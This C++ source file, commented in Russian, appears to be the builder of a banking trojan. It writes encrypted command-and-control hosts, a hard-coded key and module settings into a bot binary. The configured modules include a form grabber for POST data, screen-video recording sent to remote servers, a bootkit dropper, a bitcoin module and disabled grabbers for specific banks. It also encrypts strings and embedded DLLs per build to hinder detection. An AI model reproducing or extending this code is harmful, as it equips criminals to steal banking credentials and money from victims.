//---------------------------------------------------------------------------


#pragma hdrstop

#include "SysUtils.hpp"
#include "BuilderUtils.h"
#include "Memory.h"
#include "Crypt.h"
#include "Strings.h"
#include "Utils.h"

#include "Config.h"
#include "Hunter.h"
//#include "JavaConfig.h"
#include "VideoRecorder.h"
#include "FgrFilters.h"
#include "AzConfig.h"
#include "Sber.h"
//#include "Rafa.h"
#include "cc.h"
#include "FakeDLLInstaller.h"
#include "DllLoader.h"
#include "bitcoin.h"

//---------------------------------------------------------------------------

const PCHAR KeyForKey = "AUvS8jou0Z9K7Bf9";



PCHAR Error_UnknownMae = "Не указано имя";
PCHAR Error_MemAlloc = "Ошибка выделения памяти!";
PCHAR Error_NoSourceFile = "Исходный файл не открыт!";
PCHAR Error_BigParamDataSize = "Попытка прочитать слишком большой блок данных для параметра";
PCHAR Error_InvalidParamsFile = "Файл не фвляется файлом параметров или содержит ошибку!";
PCHAR Error_UnknownResultFileName = "Не указано имя конечного файла";
PCHAR Error_DataSizeError = "Попытка записать слишком большой блок данных";
PCHAR Error_BigPassword = "Слишком большой ключ шифрования";

PCHAR ParamStatus_Warning = "ПРЕДУПРЕЖДЕНИЕ: ";
PCHAR ParamStatus_Error   = "ОШИБКА:         ";

PCHAR StrNoParamValue = "Не установлено значение параметра \r\n --";

PCHAR ParamTitle_Hosts        = "Основные хосты бота";
PCHAR ParamTitle_BankHosts    = "Хосты режима BANKING";
PCHAR ParamTitle_Prefix       = "Префикс бота";
PCHAR ParamTitle_Delay        = "Интервал отстука";
PCHAR ParamTitle_Password     = "Ключ шифрования";



// UnicodeString Status_ = "";
UnicodeString Status_Ok = "OK";
UnicodeString Status_Error = "ОШИБКА";
UnicodeString Status_StartBuild = "Запуск сборки";
UnicodeString Status_CheckParams = "Проверяем параметры";
UnicodeString Status_WriteParams = "Записываем параметры:";
UnicodeString Status_WriteParam = "====> ";
UnicodeString Status_SaveFile = "Сохраняем файл ";
UnicodeString Status_BuildCompleted = "Сборка успешно завершена";

bool Builder::PackStringsToDoubleZeroEndLine(TStrings *Lines,
									bool CryptLines, bool TrimLines,
									PCHAR &OutBuf, DWORD &OutBufSize)
{
	//  функция упаковывает строки в одну строку. Каждая строка будет
	//  отделена нулевым символом. В конце последней строки будет стоять
	//  два нулевых символа. Пустые строки будут проигнорированы.

	if (Lines == NULL || Lines->Count == 0)
		return false;

	OutBuf = NULL;
	OutBufSize = 0;


	UnicodeString S;


	// Определяем длину буфера и удаляем пустые строки
	for (int i = Lines->Count - 1; i >= 0; i--)
    {
		S = Lines->Strings[i];
		DWORD OldLength = S.Length();

		if (TrimLines)
			S = S.Trim();

		if (S.Length() == 0)
			Lines->Delete(i);
		else
		{
			if (TrimLines && S.Length() != OldLength)
				Lines->Strings[i] = S;
			OutBufSize += S.Length() + 1;
        }
	}
	if (OutBufSize == 0) return false;

	OutBufSize++; // Резервируем место для дополнительного нуля

	// Собираем данные
	OutBuf = (PCHAR)MemAlloc(OutBufSize);
	if (OutBuf == NULL)
	{
		throw Exception(Error_MemAlloc);
    }

    PCHAR Tmp = OutBuf;

	// Копируем строки
	for (int i = 0; i < Lines->Count; i++)
    {
		S = Lines->Strings[i];
		// Копируем строку
		DWORD SL = S.Length();
		PCHAR Line = NULL;

		if (CryptLines)
		{
			Line = STR::Alloc(SL);
			DecryptStr(AnsiString(S).c_str(), Line);
		}
		else
			Line = AnsiString(S).c_str();

		m_memcpy(Tmp, Line, SL);

		if (CryptLines)
			STR::Free(Line);

		// Смещаем указатели
		Tmp += SL;
		*Tmp = 0;
		Tmp++;
	}

	// Добавляем дополнительный ноль
	*Tmp = 0;

	return true;
}





#define BUILDER_FILE_SIGNATURE 0x91A3A08A /* BOT_BUILDER_FILE */

struct TBuilderFileHeader
{
	DWORD Signature;
	DWORD Version;
	DWORD Count;
};



//*****************************************************************
//  Класс базового параметров бота
//*****************************************************************
TBotParam::TBotParam(TCustomBotModule* AOwner, PCHAR Name, DWORD Size, bool Encrypted, bool NotNull, PCHAR Title)
	: TObject()
{
	FIsDynamic = false;
	FIsSessional = false;
	FTitle = Title;
	FPosition = -1;
	FEnabled = true;
	FNotNull = NotNull;
	FEncrypted = Encrypted;

	FName = Name;
	if (FName.IsEmpty()) throw Exception("Unknown param name!");

	FSize = (Size) ? Size : STRA::Length(Name);
	if (FSize == 0) throw Exception("Unknown param size!");

	FData = (LPBYTE)MemAlloc(FSize);
	if (!FData) throw Exception("Out of memory!");

	if (AOwner)
		AOwner->InsertItem(this);
}
//---------------------------------------------------------------------------

__fastcall TBotParam::~TBotParam()
{
	if (FOwner)
		FOwner->RemoveItem(this);
	MemFree(FData);
}

//--------------------------------------------------
//  Функция очищает данные
//--------------------------------------------------
void TBotParam::Clear()
{
	m_memset(FData, 0, FSize);
	FDataSize = 0;
}

//--------------------------------------------------
//  Функция сбрасывает информацию о позиции параметра
//--------------------------------------------------
void TBotParam::ResetStatus()
{
	FPosition = -1;
}

//--------------------------------------------------
//  Функция обновляет информацию о наличии параметра
//  в указанном буфере
//--------------------------------------------------
bool TBotParam::UpdateStatus(LPBYTE Buf, DWORD BufSize)
{
	FPosition = STR::Pos(Buf, FName.c_str(), BufSize);
	return FPosition >= 0;
}

//--------------------------------------------------
//  Функция записывает данные парметра в буфер
//--------------------------------------------------
bool TBotParam::Write(LPBYTE Buf, DWORD BufSize)
{
	if (FPosition < 0) return false;

	LPBYTE Start = Buf + FPosition;
	m_memcpy(Start, FData, FSize);
	return true;
}

//--------------------------------------------------
//  Функция реальной записи значение параметра в поток
//--------------------------------------------------
void TBotParam::DoSaveToStream(TStream *Stream, LPBYTE Buf, DWORD Size)
{
	Stream->Write(&Size, sizeof(Size));
	if (Size) Stream->Write(Buf, Size);
}

//--------------------------------------------------
//  Функция сохраняет значение параметра в поток
//--------------------------------------------------
void TBotParam::SaveToStream(TStream *Stream)
{
	DoSaveToStream(Stream, FData, FDataSize);
}

//--------------------------------------------------
//  Функция реальной загрузки значения параметра из
//  потока
//--------------------------------------------------
void TBotParam::DoLoadFromStream(TStream *Stream, LPBYTE &Buf, DWORD &Size)
{
	Buf = NULL;
	Stream->Read(&Size, sizeof(Size));

	if (Size)
	{
		Buf = (LPBYTE)MemAlloc(Size);
		if (Stream->Read(Buf, Size) != Size)
			throw Exception("Read file error!");
    }
}

//--------------------------------------------------
//  Функция загружает значение параметра из потока
//--------------------------------------------------
void TBotParam::LoadFromStream(TStream *Stream)
{
	Clear();

	LPBYTE Buf = NULL;
	DWORD Size = 0;

	DoLoadFromStream(Stream, Buf, Size);

	if (Size && Buf)
	{
		try {
			SetValue(Buf, Size, false);
		} __finally {
            MemFree(Buf);
		}
    }
}

//--------------------------------------------------
//  Функция возвращает истину если парметр активен
//--------------------------------------------------
bool TBotParam::GetActive()
{
	return FEnabled && (FPosition >= 0);
}

//--------------------------------------------------
//  Функция возвращает истину если парметр
//  динамический
//--------------------------------------------------
bool TBotParam::GetIsDynamic()
{
	return FIsDynamic || FIsSessional;
}



//--------------------------------------------------
//  Функция возвращает состояние значения парметра
//--------------------------------------------------
TBotParamStatus TBotParam::ValueStatus()
{
	if (!Active || IsDynamic)
		return psOk;

	if (!FDataSize)
	{
		if (FNotNull)
			return psError;
		else
			return psWarning;
	}
	return psOk;
}


//--------------------------------------------------
//  Функция устанавливает значение параметра
//--------------------------------------------------
void TBotParam::SetValue(LPVOID Data, DWORD Size, bool Encrypt)
{
	Clear();
	if (!Data || !Size) return;

	if (Size >= FSize)
		throw Exception(Error_DataSizeError);

	m_memcpy(FData, Data, Size);
	FDataSize = Size;
	if (Encrypt)
		DecryptStr(FData, FData);
}

//--------------------------------------------------
//  Функция возвращает данные параметра как строку
//--------------------------------------------------
AnsiString TBotParam::GetAsString()
{
	AnsiString S = (PCHAR)FData;
	if (FEncrypted)
		DecryptStr(S.c_str(), S.c_str());
	return S;
}

//--------------------------------------------------
//  Функция устанавливает значение параметра из
//  строки
//--------------------------------------------------
void TBotParam::SetAsString(const AnsiString& Value)
{
	SetValue(Value.c_str(), Value.Length(), FEncrypted);
}

//--------------------------------------------------
//  Функция возвращает значение ка многострочный
//  текст
//--------------------------------------------------
AnsiString TBotParam::GetAsMultiLine()
{
	TStrings *S = new TStringList();

	TStrEnum E((PCHAR)FData, FEncrypted, 0);

	while (E.Next()) S->Add(E.Line().t_str());

	AnsiString Result = S->Text;
	delete S;
    return Result;
}

//--------------------------------------------------
//  Функция устанавливает значение из многострочного
//  текст
//--------------------------------------------------
void TBotParam::SetAsMultiLine(const AnsiString& Value)
{
	PCHAR Buf = (PCHAR)MemAlloc(FSize);
	TStrings *S = new TStringList();
	int Sz = 0;
    PCHAR Tmp = Buf;
	try
	{
    	S->Text = Value;
		for (int i = 0; i < S->Count; i++)
		{
			AnsiString Str = S->Strings[i].Trim();
			DWORD Len = Str.Length();
			if (Len == 0) continue;

			Len++;// Цепляем ноль в конце
            Sz += Len;

			// Проверяем размер с учётом того, что в конце должно
			// стоять два нуля
			if (Sz > FSize - 1)
				throw Exception(Error_DataSizeError);

			// Шифруем строку
			if (FEncrypted)
				DecryptStr(Str.c_str(), Str.c_str());

			// Копируем данные
			m_memcpy(Tmp, Str.c_str(), Len);

			Tmp += Len;
		}

        // Устанавливаем значение
        SetValue(Buf, Sz, false);

	} catch (...) {
	}

	delete S;
	MemFree(Buf);
}


//--------------------------------------------------
//  Функция возвращает значение параметра как DWORD
//--------------------------------------------------
DWORD TBotParam::GetAsLong()
{
	int Result = 0;
	if (FDataSize)
		TryStrToInt(AsString, Result);
	return Result;
}

//--------------------------------------------------
//  Функция устанавливает значение параметра как DWORD
//--------------------------------------------------
void TBotParam::SetAsLong(DWORD Value)
{
	AsString = AnsiString(Value);
}

//--------------------------------------------------
//  Функция возвращает значение параметра как bool
//--------------------------------------------------
bool TBotParam::GetAsBool()
{
	return AsString == "1";
}

//--------------------------------------------------
//  Функция устанавливает значение параметра как bool
//--------------------------------------------------
void TBotParam::SetAsBool(bool Value)
{
	AsString = (Value) ? "1" : "0";
}

//--------------------------------------------------
//  Функция проверяет правильно ли записался параметр
//  в буфер
//--------------------------------------------------
bool TBotParam::CheckParam(LPBYTE Buf, LPBYTE OriginalBuf)
{

	if (FPosition < 0)
		return false;

	// По умолчанию считаем, что параметр является
	// строковым параметром и, до окончания его
	// положения, должен стоять нудевые символ

	LPBYTE Ptr = Buf + FPosition;
	Ptr += FSize - 1;
	return *Ptr == 0;
}






//*****************************************************************
//  Класс основного пароля бота
//*****************************************************************
TMainPassword::TMainPassword(TCustomBotModule* AOwner, PCHAR Name, DWORD Size, bool Encrypted, bool NotNull, PCHAR Title)
	:TBotParam(AOwner, Name, Size, Encrypted, NotNull, Title)
{

}
__fastcall TMainPassword::~TMainPassword()
{

}

//--------------------------------------------------
//  Функция возвращает пароль в зашифрованном виде
//--------------------------------------------------
AnsiString TMainPassword::GetAsString()
{
	return FPassword;
}

//--------------------------------------------------
//  Функция устанавливает пароль в зашифрованном виде
//--------------------------------------------------
void TMainPassword::SetAsString(const AnsiString& Value)
{
	FPassword = Value;

	PCHAR Str = STR::New(Value.c_str());
	DWORD Size = 0;

	if (!STRA::IsEmpty(Str))
		RC2Crypt::Decode(KeyForKey, Str, Size);

	SetValue(Str, Size, Encrypted);
	STR::Free(Str);
}


//--------------------------------------------------
//  Функция устанавливает пароль в зашифрованном виде
//--------------------------------------------------
void TMainPassword::DoSaveToStream(TStream *Stream, LPBYTE Buf, DWORD Size)
{
	inherited::DoSaveToStream(Stream, FPassword.c_str(), FPassword.Length());
}

//--------------------------------------------------
//  Функция устанавливает пароль в зашифрованном виде
//--------------------------------------------------
void TMainPassword::DoLoadFromStream(TStream *Stream, LPBYTE &Buf, DWORD &Size)
{
	inherited::DoLoadFromStream(Stream, Buf, Size);

	if (Buf)
	{
		try {

			AnsiString S;
			S.SetLength(Size);
            m_memcpy(S.c_str(), Buf, Size);
			AsString = S;

		} __finally
		{
			MemFree(Buf);
			Buf = NULL;
            Size = 0;
		}
    }
}



//*****************************************************************
//  Класс базового модуля параметров бота
//*****************************************************************
__fastcall TCustomBotModule::TCustomBotModule(TComponent* AOwner)
	: TComponent(AOwner)
{
	FItems = new TList;
	FWriteDisabledParams = false;
}
//---------------------------------------------------------------------------

__fastcall TCustomBotModule::~TCustomBotModule()
{
    Clear();
	delete FItems;
}
//---------------------------------------------------------------------------


void TCustomBotModule::InsertItem(TBotParam* Param)
{
	if (Param)
	{
		FItems->Add(Param);
		Param->FOwner = this;
    }
}
//---------------------------------------------------------------------------

void TCustomBotModule::RemoveItem(TBotParam* Param)
{
	if (Param)
	{
		if (FItems->Remove(Param) >= 0)
			Param->FOwner = NULL;
    }
}
//---------------------------------------------------------------------------

//--------------------------------------------------
//  Функция очищает список параметров
//--------------------------------------------------
void TCustomBotModule::Clear()
{
	for (int i = 0; i < FItems->Count; i++)
	{
		TBotParam* Param = (TBotParam*)FItems->Items[i];
		Param->FOwner = NULL;
		delete Param;
	}
}


//--------------------------------------------------
//  Функция очищает сессинные параметры
//--------------------------------------------------
void TCustomBotModule::ClearSessionParams()
{
	for (int i = FItems->Count - 1; i >= 0 ; i--)
	{
		TBotParam* Param = (TBotParam*)FItems->Items[i];
		if (Param->IsSessional)
			delete Param;
	}
}


//--------------------------------------------------
//  Функция возвращает количество параметров модуля
//--------------------------------------------------
int  TCustomBotModule::GetCount()
{
	return FItems->Count;
}

//--------------------------------------------------
//  Функция возвращает признак активности модуля
//  т.е. хотябы один параметр модуля есть в сборке
//--------------------------------------------------
bool TCustomBotModule::GetActive()
{
	for (int i = 0; i < Count; i++)
	{
		if (Items[i]->FPosition >= 0)
			return true;
    }
	return false;
}


//--------------------------------------------------
//  Функция возвращает элемент по его индексу
//--------------------------------------------------
TBotParam* TCustomBotModule::GetItems(int Index)
{
	return  (TBotParam*)FItems->Items[Index];
}

//--------------------------------------------------
//  Функция сбрасывает состояние параметров
//--------------------------------------------------
void TCustomBotModule::ResetParamsStatus()
{
	for (int i = 0; i < Count; i++)
		Items[i]->ResetStatus();
}

//--------------------------------------------------
//  Функция обновляет информацию о наличии
//  параметров в буфере
//--------------------------------------------------
bool TCustomBotModule::UpdateParamsStatus(const char* FileName)
{
	ResetParamsStatus();

	DWORD Size = 0;
	LPBYTE Buf = File::ReadToBufferA((PCHAR)FileName, Size);

	if (!Buf) return false;
    bool Result = false;
	try
	{
		for (int i = 0; i < Count; i++)
			Result |= Items[i]->UpdateStatus(Buf, Size);
	} __finally
	{
		MemFree(Buf);
	}
	return Result;
}


//--------------------------------------------------
//  Функция записывает параметры модуля в буфер
//--------------------------------------------------
bool TCustomBotModule::WriteParams(LPBYTE Buf, DWORD BufSize)
{
	bool Result = false;
	for (int i = 0; i < Count; i++)
	{
		TBotParam* Param = Items[i];
		if (Param->Enabled || WriteDisabledParams)
			Result |= Param->Write(Buf, BufSize);
    }
	return Result;
}

//--------------------------------------------------
//  Функция возвращает параметр позиция которого
//  находится в позиции Position
//--------------------------------------------------
TBotParam* TCustomBotModule::GetParamForPos(int Position)
{
	for (int i = 0; i < Count; i++)
	{
		TBotParam* Param = Items[i];
		if (Param->FPosition == Position)
			return Param;
	}

	return NULL;
}


//--------------------------------------------------
//  Функция очищает значения параметров
//--------------------------------------------------
void TCustomBotModule::ClearValues()
{
	for (int i = 0; i < Count; i++)
		Items[i]->Clear();
}

//--------------------------------------------------
//  Функция возвращает параметр по имени
//--------------------------------------------------
TBotParam* TCustomBotModule::ParamByName(const AnsiString &Name)
{
	for (int i = 0; i < Count; i++)
	{
		TBotParam* Param = Items[i];
		if (Param->Name == Name)
			return Param;
	}
	return NULL;
}


// Функция проверяет состояние параметров
TBotParamStatus TCustomBotModule::CheckParamsValue(TStrings* Errors, bool FullBuild)
{
	TBotParamStatus Result = psOk;

	for (int i = 0; i < Count; i++)
	{
		TBotParam* Param = Items[i];
		bool UseParam = Param->Active && (FullBuild || Param->Enabled);
		if (!UseParam) continue;

		TBotParamStatus Status = Param->ValueStatus();
		if (Status == psOk) continue;

		// Более высокое значение статуса означает
		// большую критичность состояния
		if (Status > Result)
			Result = Status;

		// Добавляем строку
		if (Errors)
		{
			UnicodeString Str;
			switch (Status) {
				case psWarning: Str = ParamStatus_Warning; break;
				case psError:   Str = ParamStatus_Error; break;
			}

			Str += StrNoParamValue;
			Str += Param->Title;

			Errors->Add(Str);
        }
	}

	return Result;
}


//===========================================================================



//*****************************************************************
//  Модуль базовых настроек бота
//*****************************************************************
__fastcall TBaseBotModule::TBaseBotModule(TComponent* AOwner)
	: TCustomBotModule(AOwner)
{
	FPrefix    = new TBotParam(this, BOTPARAM_PREFIX, MAX_PREFIX_SIZE, true, true, ParamTitle_Prefix);
	FHosts     = new TBotParam(this, BOTPARAM_MAINHOSTS, MAX_MAINHOSTS_BUF_SIZE, true, true, ParamTitle_Hosts);
	FDelay     = new TBotParam(this, BOTPARAM_DELAY, MAX_DELAY_SIZE, false, true, ParamTitle_Delay);
	FPassword  = new TMainPassword(this, BOTPARAM_MAINPASSWORD, MAX_PASSWORD_SIZE, true, true, ParamTitle_Password);

	FDelay->AsLong = DEFAULT_DELAY;
}

__fastcall TBaseBotModule::~TBaseBotModule()
{

}

//--------------------------------------------------
//  Функция открывает файл сборки
//--------------------------------------------------
UnicodeString TBaseBotModule::GetResultFileName()
{
	// Если имя файла задалось принудительно то выходим
	UnicodeString Name = FPrefix->AsString;
	if (Name.IsEmpty())
		Name = "ResultBuild";

	// Собираем имя
	UnicodeString Path = ExtractFilePath(FFileName);
	UnicodeString Ext  = ExtractFileExt(FFileName);

	if (!Path.IsEmpty())
	{
    	Path += Name + Ext;
    }
	return Path;
}


//--------------------------------------------------
//  Функция открывает файл сборки
//--------------------------------------------------
bool TBaseBotModule::Open(const UnicodeString &FileName)
{
	Close();
	FFileName = FileName;
	AnsiString File = FileName;
	bool Result = UpdateParamsStatus(File.c_str());

	if (!Result) Close();
	return Result;
}


//--------------------------------------------------
//  Функция закрывает открытый файл
//--------------------------------------------------
bool TBaseBotModule::Close()
{
	FFileName = "";
	ResetParamsStatus();
}


//--------------------------------------------------
//  Функция создаёт сборку
//--------------------------------------------------
bool TBaseBotModule::Build(bool FullBuild)
{
	if (!Active) return false;

	WriteDisabledParams = FullBuild;

	// Открываем файл
	DWORD  Size = 0;
	LPBYTE Buf = File::ReadToBufferW(FFileName.w_str(), Size);
    if (!Buf) return false;

	// Собираем билд
	DoBeforeBuild(Buf, Size);
	bool Result = WriteParams(Buf, Size);

	// Сохраняем результат
	if (Result)
	{
		Result = File::WriteBufferW(ResultFileName.w_str(), Buf, Size) == Size;
	}

	// Уничтожаем данные
	MemFree(Buf);

	// Проверяем результат сборки
	if (Result)
	{
		TBuildChecker* Checker = new TBuildChecker(NULL, this);
		try {
			Result = Checker->Check();
		} __finally {
			delete Checker;
		}
    }

    return Result;
}


//===========================================================================

//*****************************************************************
//  Модуль дополнительных настроек бота
//*****************************************************************

__fastcall TBotModule::TBotModule(TBotBuilder *ABuilder, const UnicodeString &Name)
	: TCustomBotModule(ABuilder)
{
	FBuilder = ABuilder;
	FBuilder->FModules->Add(this);
	FModuleName = Name;
	FEdit = NULL;
}

__fastcall TBotModule::~TBotModule()
{

}

//--------------------------------------------------
//  Добавление параметров переводим владельцу
//  модуля
//--------------------------------------------------
void TBotModule::InsertItem(TBotParam* Param)
{
	inherited::InsertItem(Param);
	FBuilder->InsertItem(Param);
}

void TBotModule::RemoveItem(TBotParam* Param)
{

}

void TBotModule::Clear()
{

}

//--------------------------------------------------
//  функция возвращает истину если модуль может
//  быть отредактирован
//--------------------------------------------------
bool TBotModule::CanEdit()
{
	return FEdit != NULL;
}


//--------------------------------------------------
//  функция активирует редактор модуля
//--------------------------------------------------
bool TBotModule::Edit()
{
	return (FEdit) ? FEdit->Execute(this) : false;
}

//===========================================================================





//*****************************************************************
//  Модуль дополнительных настроек бота
//*****************************************************************
__fastcall TBotBuilder::TBotBuilder(TComponent *AOwner)
	: TBaseBotModule(AOwner)
{
	FModules = new TList();
	FEncryptDlls = true;

    // Создаём парамт пароля шифрования строк
	FSessionPassword = new TBotParam(this, BOTPARAM_SESSION_PASSW, MAX_SESSION_PASSW_SIZE, false, false, "");
	FSessionPassword->IsDynamic = true;
	FSessionPassword->AsString  = "---";

	// Создаём криптор строк
	FSringsEncryptor = new TBotStringsEncryptor(this);
	FSringsEncryptor->Password = FSessionPassword;

	// Инициализируем дополнительные модули
	TBotModule* Module;

	// Модуль Hunter
	Module = new TBotModule(this, Module_Hunter);
	new TBotParam(Module, HUNTER_PARAM_NAME, HUNTER_PARAM_SIZE, HUNTER_PARAM_ENCRYPTED, false, "Ссылки модуля Hunter");

	// Модуль формграбера
	Module = new TBotModule(this, Module_FormGraber);
	new TBotParam(Module, FGRFILTER_PARAM_NAME_URLS, FGRFILTER_PARAM_SIZE_URLS, FGRFILTER_PARAM_ENCRYPTED_URLS, false, "Ссылки формграбера");
	new TBotParam(Module, FGRFILTER_PARAM_NAME_DATAMASK, FGRFILTER_PARAM_SIZE_DATAMASK, FGRFILTER_PARAM_ENCRYPTED_DATAMASK, false, "Маски пост данных");

	// Нстройки видеорекордера
	Module = new TBotModule(this, Module_VideoRecorder);
	new TBotParam(Module, VIDEOREC_PARAM_NAME_HOST1, VIDEOREC_PARAM_SIZE_HOST, VIDEOREC_PARAM_ENCRYPTED_HOST, true,  "Сервер записи видео №1");
	new TBotParam(Module, VIDEOREC_PARAM_NAME_HOST2, VIDEOREC_PARAM_SIZE_HOST, VIDEOREC_PARAM_ENCRYPTED_HOST, false, "Сервер записи видео №2");
	new TBotParam(Module, VIDEOREC_PARAM_NAME_URLS, VIDEOREC_PARAM_SIZE_URLS, VIDEOREC_PARAM_ENCRYPTED_URLS,  false, "Адреса старта записиси видео");

	// JAVA Config
//	Module = new TBotModule(this, Module_JavaConfig);
//	new TBotParam(Module, JAVA_PARAM_NAME, JAVA_PARAM_SIZE, JAVA_PARAM_ENCRYPTED, true, "Ссылки JAVA");

	// Настройки AZ
	Module = new TBotModule(this, Module_AzConfig);
	new TBotParam(Module, AZCONFIG_PARAM_NAME_AZUSER, AZCONFIG_PARAM_SIZE_AZUSER, AZCONFIG_PARAM_ENCRYPTED_AZUSER, true, "Имя пользователя AZ");
	new TBotParam(Module, AZCONFIG_PARAM_NAME_HOSTS,  AZCONFIG_PARAM_SIZE_HOSTS,  AZCONFIG_PARAM_ENCRYPTED_HOSTS,  true, "Хосты AZ админки");

	// Настройки грабера сбер
//	Module = new TBotModule(this, Module_SberHosts);
//	new TBotParam(Module, SBERHOSTS_PARAM_NAME, SBERHOSTS_PARAM_SIZE, SBERHOSTS_PARAM_ENCRYPTED, true, "Хосты грабера SBER");

	// Настройки параметров рафы
//	Module = new TBotModule(this, Module_RafaHosts);
//	new TBotParam(Module, RAFAHOSTS_PARAM_NAME, RAFAHOSTS_PARAM_SIZE, RAFAHOSTS_PARAM_ENCRYPTED, true, "Хосты грабера RAFA");

	// Настройки системы CC
//	Module = new TBotModule(this, Module_CCHosts);
//	new TBotParam(Module, CCHOSTS_PARAM_NAME, CCHOSTS_PARAM_SIZE, ССHOSTS_PARAM_ENCRYPTED, true, "Хосты грабера CC");

	// Настройки анализатора истории навигации
	Module = new TBotModule(this, Module_HistoryAnalyzer);
	new TBotParam(Module, BOTPARAM_HISANALIZERLINKS, BOTPARAM_SIZE_HISANALIZERLINKS, BOTPARAM_ENCRYPTED_HISANALIZERLINKS, true, "Ссылки анализатора истории навигации");


	// Настройки дропера буткита
	TBotParam *p;
	Module = new TBotModule(this, Module_BootkitDroper);
		new TBotParam(Module, Param_DroperNamePrefix, 0, false, true, "Превикс дропера буткита");
		new TBotParam(Module, Param_TargetPlatform,   0, false, true, "Платформа назначения дропера буткита");
	p = new TBotParam(Module, Param_SVCFuckupEnabled, 0, false, true, "Использовать SVC подмену дропером буткита");
	p->AsString = "0";


	// Модуль
	Module = new TBotModule(this, Module_BitCoin);

	new TBotParam(Module, BITCOIN_PARAM_NAME_HOSTS, BITCOIN_PARAM_SIZE_HOSTS,
				  BITCOIN_PARAM_ENCRYPTED_HOSTS, false, "Хсты модуля BitCoint");

}


__fastcall TBotBuilder::~TBotBuilder()
{
	delete FModules;
}
//-----------------------------------------------------------------------------


//--------------------------------------------------
//  Функция сохраняет значения параметров в поток
//--------------------------------------------------
void TBotBuilder::SaveToStream(TStream *Stream)
{

	// Записываем загоовок файла
	TBuilderFileHeader H;
	H.Signature = BUILDER_FILE_SIGNATURE;
	H.Version   = BUILDER_VERSION;
	H.Count     = Count;

	Stream->Write(&H, sizeof(H));

	// Записываем параметры
	for (int i = 0; i < Count; i++)
	{
		TBotParam* P = Items[i];
		if (P->IsDynamic) continue;

		DWORD NameLen = P->Name.Length();

		// Записываем имя парамера
		Stream->Write(&NameLen, sizeof(NameLen));

		AnsiString Name = P->Name;
		Name.Unique();
		DecryptStr(Name.c_str(), Name.c_str());

		Stream->Write(Name.c_str(), NameLen);

		// Записываем данные параметра
        P->SaveToStream(Stream);
	}
}


//--------------------------------------------------
//  Функция загружает значения параметров из потока
//--------------------------------------------------
void TBotBuilder::LoadFromStream(TStream *Stream)
{
	// Загружаем настройки из потока данных
	ClearValues();

	// Читаем заголовок
	TBuilderFileHeader H;

	int Readed = Stream->Read(&H, sizeof(H));

	// Проверяем правильность заголовка
	if ( Readed < sizeof(H) || H.Signature != BUILDER_FILE_SIGNATURE)
		throw Exception(Error_InvalidParamsFile);

    // Загружаем настройки параметров
	for (DWORD i = 0; i < H.Count; i++)
	{
		// Читаем имя параметра
		DWORD NameLen = 0;
		Stream->Read(&NameLen, sizeof(NameLen));

		AnsiString Name;
		Name.SetLength(NameLen);
		Readed = Stream->Read(Name.c_str(), NameLen);
		if (Readed != NameLen)
			throw Exception(Error_InvalidParamsFile);

		DecryptStr(Name.c_str(), Name.c_str());

		// Читаем данные параметра
		TBotParam* Param = ParamByName(Name);
		if (Param)
			Param->LoadFromStream(Stream);
		else
		{
			// Параметр не найден, пропускаем блок
			DWORD Size = 0;
			Stream->Read(&Size, sizeof(Size));
			Stream->Position = Stream->Position + Size;
        }
	}
}

//--------------------------------------------------
//  Функция сохраняет значения параметров в файл
//--------------------------------------------------
void TBotBuilder::SaveToFile(const UnicodeString &FileName)
{
	TFileStream *S = new TFileStream(FileName, fmCreate);
	try {

		SaveToStream(S);

	} __finally
	{
		delete S;
	}
}

//--------------------------------------------------
//  Функция загружает значения параметров из файла
//--------------------------------------------------
void TBotBuilder::LoadFromFile(const UnicodeString &FileName)
{
	TFileStream *S = new TFileStream(FileName, fmOpenRead);
	try {

		LoadFromStream(S);

	} __finally
	{
		delete S;
	}
}



//--------------------------------------------------
//  Функция устанавливает редактор модуля
//--------------------------------------------------
void TBotBuilder::SetModuleEdit(const UnicodeString &Name, TBotModuleEdit* Edit)
{
	TBotModule* Module = ModuleByName(Name);
	if (Module)
        Module->FEdit = Edit;
}


//--------------------------------------------------
//  Функция возвращает модуль с именем Name
//--------------------------------------------------
TBotModule* TBotBuilder::ModuleByName(const UnicodeString &Name)
{
	for (int i = 0; i < FModules->Count; i++)
	{
		TBotModule* Module = (TBotModule*)FModules->Items[i];
		if (Module->ModuleName == Name)
			return Module;
	}

	return NULL;
}

//--------------------------------------------------
//  Функция возвращает количество модулей
//--------------------------------------------------
int TBotBuilder::GetModulesCount()
{
	return FModules->Count;
}

//--------------------------------------------------
//  Функция возвращает модуль по индексу
//--------------------------------------------------
TBotModule* TBotBuilder::GetModules(int Index)
{
	return (TBotModule*)FModules->Items[Index];
}


//--------------------------------------------------
//  Функция ввыполняет сборку билда
//--------------------------------------------------
bool TBotBuilder::Build(bool FullBuild)
{

	// Создаём сесионный пароль
	FSessionPassword->AsString = Random::RandomString2(MAX_SESSION_PASSW_SIZE - 1, 'a', 'z').t_str();

	// Очищаем сессионные параметры
	ClearSessionParams();


    // Создаём сборку
	return inherited::Build(FullBuild);
}

//--------------------------------------------------
//  Инициализируем сессионные параметры
//--------------------------------------------------
void TBotBuilder::DoBeforeBuild(LPBYTE Buf, DWORD BufSize)
{
	// Инициализируем параметры шифрования DLL
	InitializeDLLsEncryptors(Buf, BufSize);
}


//--------------------------------------------------
//  Функция инициализирует параметры шифрования DLL
//--------------------------------------------------
void TBotBuilder::InitializeDLLsEncryptors(LPBYTE Buf, DWORD BufSize)
{
	if (!EncryptDlls) return;

	LPBYTE StartPtr = Buf;
	while (true)
	{
		// Определяем позицию DLL в буфере
		int Pos = STR::Pos(Buf, ENCRYPTED_DLL_MARKER, BufSize - (Buf - StartPtr), true);
		if (Pos < 0) break;

		// Запоминаем начало маркера
		PCHAR MarkerPtr = Buf + Pos;

		// Определяем позицию относительно всего буфера
		int GlobalPos = MarkerPtr - StartPtr;

		// Переходим к длл
		Buf     += Pos + ENCRYPTED_DLL_MARKER_SIZE;

		// Определяем размер данных
		DWORD DllSize = *(PDWORD)Buf;

		// Пропускаем данные о размере
		Buf     += sizeof(DWORD);

		if (DllSize > BufSize)
			throw Exception("Нарушение целостности встроенных DLL!\r\nОбратитесь к разработчикам!");


		// Пропускаем длл
		Buf     += DllSize;

		// Создаём элемент
		DWORD TotalSize = ENCRYPTED_DLL_MARKER_SIZE + sizeof(DWORD) + DllSize;
		TBotDLLEncryptor *Item = new TBotDLLEncryptor(this, GlobalPos, TotalSize);
	}


}

//--------------------------------------------------
//  Функция возвращает естину если включено
//  шифрование строк
//--------------------------------------------------
bool TBotBuilder::GetEncryptStrings()
{
	return FSringsEncryptor->Enabled;
}

//--------------------------------------------------
//  Функция включает/отключает шифрование строк
//--------------------------------------------------
void TBotBuilder::SetEncryptStrings(bool Value)
{
	FSringsEncryptor->Enabled = Value;
}


